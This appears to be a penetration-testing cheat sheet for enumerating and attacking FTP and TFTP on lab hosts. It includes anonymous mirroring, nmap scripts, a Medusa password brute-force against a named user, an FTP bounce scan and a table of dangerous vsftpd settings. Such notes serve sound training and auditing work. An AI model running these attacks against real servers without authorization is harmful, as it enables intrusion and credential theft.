
## FTP Commands

vsftpd Configuration File
```python
cat /etc/vsftpd.conf | grep -v "#"
```

**ftp users**
```python
cat /etc/ftpusers
```

**These will make the server show us more information**
```python
ftp> debug
```

```python
ftp> trace
```

```python
ftp> ls
```

**Download all available files**
```python
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
```

**Recursively List**
```go
LIST -R
```


**Upload a file**
```python
ftp> put testupload.txt
```

**Find all NSE FTP scripts**
```python
find / -type f -name ftp* 2>/dev/null | grep scripts
```

**Connecting to FTP over TLS/SSL**
```python
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```



## NMAP FTP Enumeration 

NMAP FTP Scan
```python
sudo nmap -sV -p21 -sC -A 10.129.14.136
```

Nmap also provides the ability to trace the progress of NSE scripts at the network level if we use the `--script-trace` option in our scans. This lets us see what commands Nmap sends, what ports are used, and what responses we receive from the scanned server.
```python
sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace
```

**Brute Forcing FTP w/Medusa**
```python
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
```

**FTP Bounce Back Attack**
```python
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```
# Dangerous FTP Settings
|**Setting**|**Description**|
|---|---|
|`anonymous_enable=YES`|Allowing anonymous login?|
|`anon_upload_enable=YES`|Allowing anonymous to upload files?|
|`anon_mkdir_write_enable=YES`|Allowing anonymous to create new directories?|
|`no_anon_password=YES`|Do not ask anonymous for password?|
|`anon_root=/home/username/ftp`|Directory for anonymous.|
|`write_enable=YES`|Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?|
# TFTP Commands
|**Commands**|**Description**|
|---|---|
|`connect`|Sets the remote host, and optionally the port, for file transfers.|
|`get`|Transfers a file or set of files from the remote host to the local host.|
|`put`|Transfers a file or set of files from the local host onto the remote host.|
|`quit`|Exits tftp.|
|`status`|Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on.|
|`verbose`|Turns verbose mode, which displays additional information during file transfer, on or off.|
# More FTP Commands
|**Commands**|**Description**|
|---|---|
|`connect`|Sets the remote host, and optionally the port, for file transfers.|
|`get`|Transfers a file or set of files from the remote host to the local host.|
|`put`|Transfers a file or set of files from the local host onto the remote host.|
|`quit`|Exits tftp.|
|`status`|Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on.|
|`verbose`|Turns verbose mode, which displays additional information during file transfer, on or off.|